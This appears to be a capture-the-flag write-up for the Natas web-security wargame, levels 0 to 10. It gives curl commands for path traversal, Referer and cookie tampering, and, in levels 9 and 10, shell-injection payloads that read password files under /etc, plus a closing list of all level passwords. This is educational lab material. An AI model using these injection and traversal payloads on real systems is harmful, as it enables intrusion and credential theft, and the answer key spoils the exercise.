# Natas - Overthewrite  

Natas teaches the basics of serverside web-security.  

Each level of natas consists of its own website located at http://natasX.natas.labs.overthewire.org, where X is the level number. There is no SSH login. To access a level, enter the username for that level (e.g. natas0 for level 0) and its password.  

Each level has access to the password of the next level. Your job is to somehow obtain that next password and level up. All passwords are also stored in /etc/natas_webpass/. E.g. the password for natas5 is stored in the file /etc/natas\_webpass/natas5 and only readable by natas4 and natas5.  

Start here:  

Username: `natas0`  
Password: `natas0`  
URL:      `http://natas0.natas.labs.overthewire.org`  

## Level 0

```bash
curl --silent --user natas0:natas0 http://natas0.natas.labs.overthewire.org
```

```bash
curl --silent --user natas0:natas0 http://natas0.natas.labs.overthewire.org | grep "password"
```

## Level 1

```bash
curl --silent --user natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto http://natas1.natas.labs.overthewire.org
```

```bash
curl --silent --user natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto http://natas1.natas.labs.overthewire.org | grep "password"
```

## Level 2

```bash
curl --silent --user natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi http://natas2.natas.labs.overthewire.org
```

In page source, notify a piece of code  

```html
<div id="content">
There is nothing on this page
<img src="files/pixel.png">
```

Try to access the `files` directory

```bash
curl --silent --user natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi http://natas2.natas.labs.overthewire.org/files/
```

![image](https://user-images.githubusercontent.com/31420144/105458850-dceb9b00-5cbb-11eb-9e06-6d5561b6b6b7.png)

Perhaps there's a hint in the file `users.txt`    

```bash
curl --silent --user natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi http://natas2.natas.labs.overthewire.org/files/users.txt
```

```bash
curl --silent --user natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi http://natas2.natas.labs.overthewire.org/files/users.txt | grep "natas3"
```


## Level 3

```bash
curl --silent --user natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/
```

Notify the code  

```html
<div id="content">
There is nothing on this page
<!-- No more information leaks!! Not even Google will find it this time... -->
</div>
```

**Google**?, consider `robots.txt`

```bash
curl --silent --user natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/robots.txt
```

```html
User-agent: *
Disallow: /s3cr3t/
```

&rarr; try to access the `s3cr3t` directory/file

```bash
curl --silent --user natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/s3cr3t/
```

Open the result page in browser, we've found the file `users.txt`  

![image](https://user-images.githubusercontent.com/31420144/105458985-0f959380-5cbc-11eb-8537-7a5484cb52c8.png)

Get the content of `users.txt`  

```bash
curl --silent --user natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
```

```bash
curl --silent --user natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt | grep "natas4"
```

## Level 4

```bash
curl --silent --user natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ http://natas4.natas.labs.overthewire.org
```

Consider the code  

```html
<div id="content">

Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
```

We need to point the referrer of request to _"http://natas5.natas.labs.overthewire.org/"_

```bash
curl --silent --user natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ --referer "http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org
```

```bash
curl --silent --user natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ --referer "http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org | grep "natas5"
```

## Level 5

```bash
curl --silent --user natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq http://natas5.natas.labs.overthewire.org
```

Notify the code  

```html
<div id="content">
Access disallowed. You are not logged in</div>
```

**Not logged in**, consider manipulating the cookie  

![image](https://user-images.githubusercontent.com/31420144/105458207-b24d1280-5cba-11eb-8e5c-058152f47b35.png)

&rarr; Change the field `loggedin`

```bash
curl --silent --user natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq --cookie loggedin=1 http://natas5.natas.labs.overthewire.org
```

```bash
curl --silent --user natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq --cookie loggedin=1 http://natas5.natas.labs.overthewire.org | grep "natas6"
```

## Level 6

```bash
curl --silent --user natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 http://natas6.natas.labs.overthewire.org
```

We get the result  

```html
<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>
```

![image](https://user-images.githubusercontent.com/31420144/105458635-8aaa7a00-5cbb-11eb-9f9c-167669a9279a.png)

Now we should view sourcecode  

```bash
curl --silent --user natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 http://natas6.natas.labs.overthewire.org/index-source.html
```

Consider the piece of code  

```html
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

Try to view the file `includes/secret.inc`  

```bash
curl --silent --user natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 http://natas6.natas.labs.overthewire.org/includes/secret.inc
```

Now, copy the secret key `FOEIUWGHFEEUHOFUOIU` and input it into the natas6 form or use `curl` 

```bash
curl --silent --user natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 --data "secret=FOEIUWGHFEEUHOFUOIU&submit=Submit+Query" http://natas6.natas.labs.overthewire.org/
```

```bash
curl --silent --user natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 --data "secret=FOEIUWGHFEEUHOFUOIU&submit=Submit+Query" http://natas6.natas.labs.overthewire.org/ | grep "natas7"
```

## Level 7

```bash
curl --silent --user natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 http://natas7.natas.labs.overthewire.org/
```

Notify the line  

```html
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
```

Try to substitute the url endpoint `index.php?page=` + `etc/natas_webpass/natas8`   

```bash
curl --silent --user natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 http://natas7.natas.labs.overthewire.org/index.php?page=etc/natas_webpass/natas8
```

&rarr; failed  
Try again with `index.php?page=/etc/natas_webpass/natas8`

```bash
curl --silent --user natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```

Got the password for the next level `DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`

## Level 8

```bash
curl --silent --user natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe http://natas8.natas.labs.overthewire.org/
```

Got a page, notify the code  

```html
<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>
```

![image](https://user-images.githubusercontent.com/31420144/105462020-a2d0c800-5cc0-11eb-894e-932d48868d32.png)

Now we should view sourcecode  

Consider the piece of code  

```html
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

Ya `secretCode` &rarr; bin2hex &rarr; strrev &rarr; base64_encode &rarr; `encodedSecret`  

We should decrypt the `encodedSecret` using php script  

```php
echo base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362')));
```

## Level 9

```bash
curl --silent --user natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl http://natas9.natas.labs.overthewire.org/
```

![image](https://user-images.githubusercontent.com/31420144/105504746-b8fb7a00-5cfa-11eb-80bb-36f9347a7d86.png)

We should view sourcecode  

Consider this piece of code  

```php
Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>
```

Notify that the php script does not filter special characters (e.g `;`)

I'm solving this level using browser input form  

* Try inputting `; ls . #` &rarr; the passthru command will be `grep -i ; ls . # dictionary.txt` &rarr; no hint
* Try inputting `; ls /etc #` &rarr; the passthru command will be `grep -i ; ls /etc # dictionary.txt` &rarr; we've found the file `natas_webpass` in the list
* Try inputting `; ls /etc/natas_webpass #` &rarr; the passthru command will be `grep -i ; ls /etc/natas_webpass # dictionary.txt`

![image](https://user-images.githubusercontent.com/31420144/105506911-28726900-5cfd-11eb-8482-0d5b6de9142b.png)


* Finally inputting `; cat /etc/natas_webpass/natas10 #` &rarr; we've got the password

Excuse me, I copied the following url from a GET request in Chrome Developer Tools _http://natas9.natas.labs.overthewire.org/?needle=%3B+cat+%2Fetc%2Fnatas\_webpass%2Fnatas10+%23&submit=Search_   

```bash
curl --silent --user natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl --data "needle=%3B+cat+%2Fetc%2Fnatas_webpass%2Fnatas10+%23&submit=Submit+Query" http://natas9.natas.labs.overthewire.org/
```

or  

```bash
curl --silent --user natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl http://natas9.natas.labs.overthewire.org/?needle=%3B+cat+%2Fetc%2Fnatas_webpass%2Fnatas10+%23&submit=Search
```

## Level 10

```bash
curl --silent --user natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu http://natas10.natas.labs.overthewire.org/
```

We should view sourcecode  

```php
For security reasons, we now filter on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
</pre>
```

They now **filtered** special characters `;`, `|`, `&`  

I'm solving this level using browser input form &rarr; input `.* /etc/natas_webpass/natas11 #`

```bash
curl --silent --user natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu --data "needle=.*+%2Fetc%2Fnatas_webpass%2Fnatas11+%23&submit=Submit+Query" http://natas10.natas.labs.overthewire.org
```

or  

```bash
curl --silent --user natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu http://natas10.natas.labs.overthewire.org/?needle=.*+%2Fetc%2Fnatas_webpass%2Fnatas11+%23&submit=Search
```



## tldr; solution

natas0  - `natas0`  
natas1  - `gtVrDuiDfck831PqWsLEZy5gyDz1clto`  
natas2  - `ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi`  
natas3  - `sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14`  
natas4  - `Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`  
natas5  - `iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`  
natas6  - `aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`    
natas7  - `7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`  
natas8  - `DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`    
natas9  - `W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`  
natas10 - `nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`  
natas11 - `U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK`   
